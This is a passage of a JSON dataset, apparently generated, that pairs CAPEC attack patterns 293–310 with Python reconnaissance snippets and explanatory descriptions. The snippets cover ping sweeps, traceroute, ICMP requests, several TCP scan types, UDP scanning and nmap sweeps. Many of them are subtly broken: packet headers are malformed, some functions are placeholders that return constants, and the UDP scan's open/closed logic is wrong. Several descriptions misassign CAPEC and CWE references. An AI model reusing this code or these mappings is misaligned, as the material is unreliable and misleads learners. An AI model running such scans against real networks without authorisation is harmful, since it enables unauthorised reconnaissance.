        "code_snippet": "import socket\nimport struct\n\n# Function to send a ping request\ndef send_ping(ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # ICMP header: Type (8), Code (0), Checksum (0), ID, Sequence\n        icmp_header = struct.pack('bbHHh', 8, 0, 0, 1, 1)\n        icmp_payload = b'\\x00' * 48  # 48 bytes of payload\n        packet = icmp_header + icmp_payload\n\n        # Send the packet\n        sock.sendto(packet, (ip, 1))\n\n        # Receive the response\n        response, _ = sock.recvfrom(1024)\n        return True if response else False\n    except Exception as e:\n        return False\n\n# Function to perform a ping sweep\ndef ping_sweep(ip_range):\n    alive_hosts = []\n    for ip in ip_range:\n        if send_ping(ip):\n            alive_hosts.append(ip)\n    return alive_hosts\n\n# Example usage\nip_range = ['192.168.1.{}'.format(i) for i in range(1, 255)]\nalive_hosts = ping_sweep(ip_range)\nprint('Alive hosts:', alive_hosts)",
        "description": "This Python code snippet demonstrates a basic implementation of a 'ping sweep' to discover live hosts within a given IP range. The `send_ping` function sends an ICMP echo request (ping) to a specified IP address and waits for a response. If a response is received, the host is considered alive. The `ping_sweep` function iterates over a range of IP addresses, using `send_ping` to check each one, and collects the IPs of the hosts that respond. This code embodies the main idea of the CAPEC 'Host Discovery' by performing network reconnaissance to identify active hosts. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information) by potentially revealing live hosts, and CWE-291 (Reliance on IP Address for Authentication) by assuming that a response indicates a valid host without further verification."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to perform traceroute\ndef traceroute(dest_name, max_hops=30):\n    dest_addr = socket.gethostbyname(dest_name)\n    port = 33434\n    ttl = 1\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.bind(('', port))\n        send_socket.sendto(b'', (dest_addr, port))\n        start_time = time.time()\n        try:\n            data, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            elapsed_time = (time.time() - start_time) * 1000\n            print(f'{ttl}\t{curr_addr}\t{elapsed_time:.2f} ms')\n        except socket.error:\n            print(f'{ttl}\t*\tRequest timed out.')\n        finally:\n            send_socket.close()\n            recv_socket.close()\n        ttl += 1\n        if curr_addr == dest_addr:\n            break\n\n# Example usage\ntraceroute('example.com')",
        "description": "This Python code snippet performs a traceroute to a specified destination, 'example.com' in this case. The traceroute function sends UDP packets with incrementing TTL values to the destination address. Each hop along the route responds with an ICMP 'Time Exceeded' message when the TTL expires, allowing the function to map out the route to the destination. This process continues until the destination is reached or the maximum number of hops is exceeded. The code demonstrates the concept of 'Traceroute Route Enumeration' (CAPEC-309) by mapping the network path to a target. It also highlights potential vulnerabilities such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Cleartext Transmission of Sensitive Information' (CWE-319), as the route information and timing data are transmitted in cleartext and could be intercepted by unauthorized actors."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Address Mask Request (Type 17, Code 0)\nicmp_packet = b'\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Address Mask Request\nsock.sendto(icmp_packet, (target_ip, 0))\n\n# Receive the ICMP Address Mask Reply\nresponse, _ = sock.recvfrom(1024)\n\n# Extract and print the address mask from the response\naddress_mask = response[20:24]\nprint(f'Address Mask: {\".\".join(map(str, address_mask))}')",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Address Mask Request (Type 17) to a target IP address to gather information about the target's networking configuration. The code creates a raw socket, constructs an ICMP Address Mask Request packet, and sends it to the specified target IP. It then waits for an ICMP Address Mask Reply (Type 18) and extracts the address mask from the response. This type of information can be used to plan further attacks, such as router-based attacks or denial-of-service attacks. The code embodies the main idea of the CAPEC by exposing sensitive network configuration information, and it touches on related CWEs such as exposure of sensitive information (CWE-200) and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import requests\nimport time\n\n# Function to get the server timestamp\ndef get_server_timestamp(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.headers['Date']\n    return None\n\n# URL of the target server\nurl = 'http://example.com'\n\n# Get the server timestamp\nserver_time = get_server_timestamp(url)\nif server_time:\n    print(f'Server time: {server_time}')\n\n# Simulate an attack using the timestamp\n# This is a placeholder for an actual attack leveraging the timestamp\n# For example, using the timestamp to predict random number generator outputs\nif server_time:\n    # Simulate a delay to observe timing discrepancies\n    time.sleep(1)\n    new_server_time = get_server_timestamp(url)\n    if new_server_time:\n        print(f'New server time: {new_server_time}')\n        if server_time != new_server_time:\n            print('Timing discrepancy observed!')",
        "description": "This Python code snippet demonstrates a potential 'Timestamp Request' attack. The code sends a GET request to a target server to retrieve the server's timestamp from the response headers. It then prints the server time and simulates an attack by introducing a delay and making another request to observe any timing discrepancies. This can be used to exploit time-based security mechanisms, such as predicting random number generator outputs or bypassing time-based authentication. The code also highlights the CWE-200 (Exposure of Sensitive Information), CWE-208 (Observable Timing Discrepancy), and CWE-385 (Covert Timing Channel) by showing how sensitive information (timestamp) can be exposed and used to infer protected information through timing analysis."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Information Request message (Type 15, Code 0)\nicmp_info_request = b'\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Information Request\nsock.sendto(icmp_info_request, (target_ip, 0))\n\n# Receive the response\nresponse, addr = sock.recvfrom(1024)\n\n# Print the response\nprint(f'Received response from {addr}: {response}')",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Information Request (Type 15, Code 0) to a target host to determine if it responds to this deprecated mechanism. The code creates a raw socket, constructs the ICMP Information Request message, and sends it to the specified target IP address. It then waits for a response and prints it. This action can expose sensitive information (CWE-200, CWE-497) if the target responds, as the ICMP Information Request is a deprecated and insecure method. Additionally, the transmission of the request and response in cleartext (CWE-319) can be intercepted by unauthorized actors."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n\ndef tcp_ack_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP ACK packet\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n        packet += socket.inet_aton('192.168.1.100')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example: 80)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data Offset, Reserved, Flags (ACK) | Window Size\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}: {response}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\n# This will send a TCP ACK ping to the target IP and port\n# Note: Requires root privileges to run\nif __name__ == '__main__':\n    tcp_ack_ping('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a TCP ACK Ping, which is used to determine if a host is alive by sending a TCP segment with the ACK flag set. The code constructs a raw TCP packet and sends it to the target IP and port. If the host is alive, it will respond with a RST packet, which the script captures and prints. The code also highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) as the packet is sent in cleartext, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as the response reveals the host's status, and CWE-605 (Multiple Binds to the Same Port) as the raw socket could interfere with other services on the same port. Note that running this script requires root privileges due to the use of raw sockets."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a high port and wait for an ICMP response\ndef udp_ping(target_ip, target_port=65535):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(2)  # Set a timeout for the socket\n\n        # Send a UDP packet to the target IP and port\n        sock.sendto(b'', (target_ip, target_port))\n\n        # Try to receive a response (expecting ICMP port unreachable)\n        try:\n            data, addr = sock.recvfrom(1024)\n            print(f'Received response from {addr}')\n        except socket.timeout:\n            print('No response received (host might be down or filtered)')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_ping('192.168.1.1')",
        "description": "This Python code snippet demonstrates a UDP ping to a high port (65535) on a target IP address to determine if the host is alive. The code creates a UDP socket and sends an empty UDP packet to the specified target IP and port. It then waits for a response, expecting an ICMP 'port unreachable' message if the port is closed, which indicates that the host is alive. The code handles potential exceptions and sets a timeout for the socket to avoid indefinite waiting. This snippet embodies the main idea of the CAPEC by attempting to elicit a response from the target to determine its status. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), incorrect destination specification (CWE-941), and improper handling of outbound error messages (CWE-1320)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# Function to perform TCP SYN Ping\ndef tcp_syn_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP SYN packet\n        packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n        packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP header\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n        else:\n            print(f'No response from {target_ip}:{target_port}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_syn_ping(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP SYN Ping, which is used for host discovery by sending a TCP SYN packet to a target IP and port. The code creates a raw socket and constructs a TCP SYN packet, then sends it to the target. If a response is received, it indicates that the host is alive. This technique can expose sensitive information (CWE-200) about the host's status. The code also highlights potential issues such as cleartext transmission (CWE-319) and improper enforcement of message integrity (CWE-924) during the communication process."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information and allows port scanning\n\ndef check_open_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        s.close()\n    return open_ports\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_check = [22, 80, 443, 8080]\nopen_ports = check_open_ports(ip_address, ports_to_check)\nprint(f'Open ports on {ip_address}: {open_ports}')\n\n# Exposing sensitive information\nif open_ports:\n    print(f'Sensitive information: Open ports on {ip_address} are {open_ports}')\n\n# Cleartext transmission of sensitive information\nsensitive_data = 'username:password'\nprint(f'Transmitting sensitive data in cleartext: {sensitive_data}')",
        "description": "This Python code snippet demonstrates a simple port scanning functionality, which embodies the main idea of the CAPEC 'Port Scanning'. The function 'check_open_ports' scans a given list of ports on a specified IP address to determine which ports are open. The code also includes examples of related CWEs: it exposes sensitive information (CWE-200) by printing open ports, and it transmits sensitive data in cleartext (CWE-319) by printing a username and password. This code is vulnerable as it allows an adversary to determine the state of the ports on a remote target and exposes sensitive information without proper authorization or encryption."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-617: Reachable Assertion\n# CWE-353: Missing Support for Integrity Check\n\ndef tcp_connect_scan(target_ip, target_port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        \n        # Attempt to connect to the target IP and port\n        result = sock.connect_ex((target_ip, target_port))\n        \n        if result == 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n        \n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n        \n# Example usage\nif __name__ == \"__main__\":\n    target_ip = \"192.168.1.1\"\n    target_port = 80\n    tcp_connect_scan(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a basic TCP connect scan, which is the main idea of the CAPEC 'TCP Connect Scan'. The function 'tcp_connect_scan' attempts to establish a full TCP connection to a specified IP address and port. If the connection is successful, it indicates that the port is open; otherwise, it reports the port as closed. The code also includes potential vulnerabilities related to the CWEs mentioned: reliance on IP address for authentication (CWE-291), exposure of sensitive information (CWE-200), multiple binds to the same port (CWE-605), reachable assertion (CWE-617), and missing support for integrity check (CWE-353). The code is designed to be concise and illustrate the concept of a TCP connect scan."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\ndef tcp_fin_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with FIN flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x01\\x00\\x00'  # Data Offset, Reserved, Flags (FIN) | Window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\ntcp_fin_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP FIN scan, which is used to determine if a port on a target machine is closed. The code creates a raw socket and constructs a TCP packet with the FIN flag set. It sends this packet to the target IP and port, then listens for a response. If a TCP RST packet is received, it indicates that the port is closed. This scan technique leverages the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports elicit a RST response. The code also touches on related CWEs by demonstrating potential exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP Xmas Scan\ndef tcp_xmas_scan(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct the TCP packet with all flags set (Xmas Tree Packet)\n    packet = b''\n    # IP Header (20 bytes)\n    packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n    packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    # TCP Header (20 bytes)\n    packet += b'\\x00\\x50\\x00\\x50'  # Source Port | Destination Port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    packet += b'\\x50\\xff\\xff\\xff'  # Data Offset, Reserved, Flags (all set)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window Size | Checksum | Urgent Pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, target_port))\n\n    # Receive the response\n    try:\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n    except socket.timeout:\n        print(f'No response from {target_ip}:{target_port}')\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.2'  # Target IP (example)\n    target_port = 80  # Target Port (example)\n    tcp_xmas_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The code creates a raw socket and constructs a TCP packet with all flags set (Xmas Tree Packet). It then sends this packet to the target IP and port. If the port is closed, the target machine should respond with a RST packet, which can be detected by the attacker. This scan type exploits the behavior described in RFC 793, where out-of-state flags sent to closed ports should generate a RST response. The code also highlights potential weaknesses such as exposure of sensitive information, missing integrity checks, and improper restriction of communication channels."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP NULL scan\ndef tcp_null_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with no flags set (NULL scan)\n        packet = b''\n        packet += b'\\x45\\x00\\x00\\x28'  # IP header (simplified)\n        packet += b'\\x00\\x00\\x40\\x00\\x40\\x06\\x00\\x00'  # IP header (simplified)\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x50'  # Source and destination ports (example)\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number\n        packet += b'\\x50\\x00\\x00\\x00'  # Data offset and flags (NULL)\n        packet += b'\\x00\\x00\\x00\\x00'  # Window, checksum, urgent pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n        else:\n            print(f'No response from {target_ip}:{target_port}')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    tcp_null_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which is used to determine if ports are closed on a target machine. The code creates a raw socket and constructs a TCP packet with no flags set, which is illegal according to RFC 793. The packet is then sent to the target IP and port. If the port is closed, the target machine should respond with a RST packet. The code also includes error handling for socket operations. This example embodies the main idea of the CAPEC by illustrating how an attacker might use a TCP NULL scan to identify closed ports. The related CWEs provide additional context, such as the potential exposure of sensitive information and the importance of handling NULL pointers and checking return values."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: Cleartext transmission of sensitive information\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Function to perform a TCP ACK scan\n# This function sends TCP ACK packets to a target to gather information about firewall rules\n\ndef tcp_ack_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct a TCP packet with ACK flag set\n        packet = b''  # Simplified packet construction for demonstration\n        packet += b'\\x45\\x00\\x00\\x28'  # IP header (simplified)\n        packet += b'\\x06'  # Protocol (TCP)\n        packet += b'\\x00\\x00'  # Checksum (simplified)\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50'  # Source port (example)\n        packet += target_port.to_bytes(2, 'big')  # Destination port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence number (simplified)\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number (simplified)\n        packet += b'\\x50\\x10'  # Flags (ACK)\n        packet += b'\\x00\\x00'  # Window size (simplified)\n        packet += b'\\x00\\x00'  # Checksum (simplified)\n        packet += b'\\x00\\x00'  # Urgent pointer (simplified)\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recv(1024)\n        print(f'Received response: {response}')\n\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\n# This would be replaced with actual target IP and port\ntcp_ack_scan('192.168.1.2', 80)\n",
        "description": "This Python code snippet demonstrates a simplified version of a TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code creates a raw socket and constructs a TCP packet with the ACK flag set. It then sends this packet to a specified target IP and port, and waits for a response. The response can provide insights into the firewall rules in place. The code also embodies CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by transmitting potentially sensitive information in cleartext and exposing it to unauthorized actors. This example is for educational purposes and should not be used for unauthorized scanning."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef tcp_window_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Send a TCP packet with ACK flag set\n        packet = create_ack_packet(target_ip, target_port)\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n        window_size = parse_window_size(response)\n\n        if window_size > 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef create_ack_packet(target_ip, target_port):\n    # This function should create a TCP packet with the ACK flag set\n    # For simplicity, this is a placeholder\n    return b''\n\n\ndef parse_window_size(response):\n    # This function should parse the TCP window size from the response\n    # For simplicity, this is a placeholder\n    return 0\n\n# Example usage\nif __name__ == '__main__':\n    tcp_window_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP Window Scan, which is used to infer the status of a port and potentially the operating system type based on the TCP window size field in RST packets. The code creates a raw socket, sends a TCP packet with the ACK flag set to the target IP and port, and then parses the response to determine the window size. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan method can expose sensitive information (CWE-200, CWE-497) and is vulnerable to interception (CWE-319) and integrity issues (CWE-353)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: Exposes sensitive information and allows multiple binds to the same port\nHOST = '0.0.0.0'  # Listen on all interfaces\nPORT = 111  # Common port for RPC services\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Allow multiple binds to the same port\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n# Bind the socket to the host and port\ns.bind((HOST, PORT))\n\n# Listen for incoming connections\ns.listen(5)\nprint(f'Listening on {HOST}:{PORT}')\n\nwhile True:\n    conn, addr = s.accept()\n    print(f'Connection from {addr}')\n    # Expose sensitive information\n    conn.send(b'RPC Service: Sensitive Information Exposed')\n    conn.close()",
        "description": "This Python code snippet demonstrates a vulnerable TCP RPC service that listens on all interfaces (0.0.0.0) and a common RPC port (111). The code allows multiple binds to the same port using the SO_REUSEADDR socket option, which can lead to port hijacking or spoofing (CWE-605). Additionally, the service exposes sensitive information to any connecting client without proper authorization (CWE-200). This setup can be exploited by an adversary scanning for RPC services on a Unix/Linux host, as described in the CAPEC. The code represents the main idea of the CAPEC by illustrating how an insecure RPC service can be implemented, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\n\n# Function to perform UDP scan\ndef udp_scan(target_ip, target_port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(1)\n\n        # Send an empty UDP packet\n        sock.sendto(b'', (target_ip, target_port))\n\n        try:\n            # Try to receive a response\n            data, _ = sock.recvfrom(1024)\n            print(f'Port {target_port} is open or filtered')\n        except socket.timeout:\n            print(f'Port {target_port} is open (no response)')\n        except Exception as e:\n            print(f'Error: {e}')\n    except Exception as e:\n        print(f'Failed to create socket: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_scan('192.168.1.1', 12345)",
        "description": "This Python code snippet demonstrates a basic UDP scan to determine the status of a UDP port on a target system. The function `udp_scan` creates a UDP socket and sends an empty UDP packet to the specified target IP and port. It then waits for a response to determine if the port is open or filtered. If no response is received within the timeout period, it assumes the port is open. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the status of a UDP port. The related CWEs are represented in the context of potential vulnerabilities: the code does not handle sensitive information securely (CWE-200, CWE-319), does not verify data integrity (CWE-353), and could be used to infer information through timing (CWE-385)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport subprocess\n\ndef network_topology_mapping():\n    # Using a simple ICMP ping scan to map network nodes\n    ip_range = '192.168.1.0/24'\n    try:\n        # This command can expose sensitive information to unauthorized actors (CWE-200)\n        result = subprocess.check_output(['nmap', '-sn', ip_range], stderr=subprocess.STDOUT)\n        print(result.decode('utf-8'))\n    except subprocess.CalledProcessError as e:\n        # Improper management of sensitive trace data (CWE-1323)\n        print(f'Error during network scan: {e.output.decode('utf-8')}')\n\nif __name__ == '__main__':\n    network_topology_mapping()",
        "description": "This Python code snippet demonstrates a basic network topology mapping using the 'nmap' tool to perform an ICMP ping scan on a specified IP range. The code captures the essence of the CAPEC by engaging in scanning activities to map network nodes. The subprocess.check_output function is used to execute the nmap command, which can expose sensitive information to unauthorized actors (CWE-200). Additionally, the error handling in the code may lead to improper management of sensitive trace data (CWE-1323) if the error output is not properly secured. This example highlights the potential vulnerabilities associated with network reconnaissance activities."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\n\n# Function to scan for open ports\ndef scan_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to check for vulnerable services\ndef check_vulnerable_services(ip, open_ports):\n    vulnerable_services = {}\n    for port in open_ports:\n        if port == 21:  # FTP\n            vulnerable_services[port] = 'FTP'\n        elif port == 23:  # Telnet\n            vulnerable_services[port] = 'Telnet'\n        elif port == 25:  # SMTP\n            vulnerable_services[port] = 'SMTP'\n        elif port == 161:  # SNMP\n            vulnerable_services[port] = 'SNMP'\n    return vulnerable_services\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_scan = [21, 23, 25, 80, 161]\nopen_ports = scan_ports(ip_address, ports_to_scan)\nvulnerable_services = check_vulnerable_services(ip_address, open_ports)\n\nprint(f'Open Ports: {open_ports}')\nprint(f'Vulnerable Services: {vulnerable_services}')",
        "description": "This Python code snippet demonstrates a basic port scanning and service identification process, which aligns with the CAPEC description of 'Scanning for Vulnerable Software'. The `scan_ports` function scans a given IP address for open ports from a specified list. The `check_vulnerable_services` function then checks these open ports against a list of known vulnerable services (FTP, Telnet, SMTP, SNMP). The code highlights the potential exposure of sensitive system information (CWE-497) and the risk of excessive attack surface (CWE-1125) by identifying open ports and associated services that could be exploited if not properly secured."
    },
    {
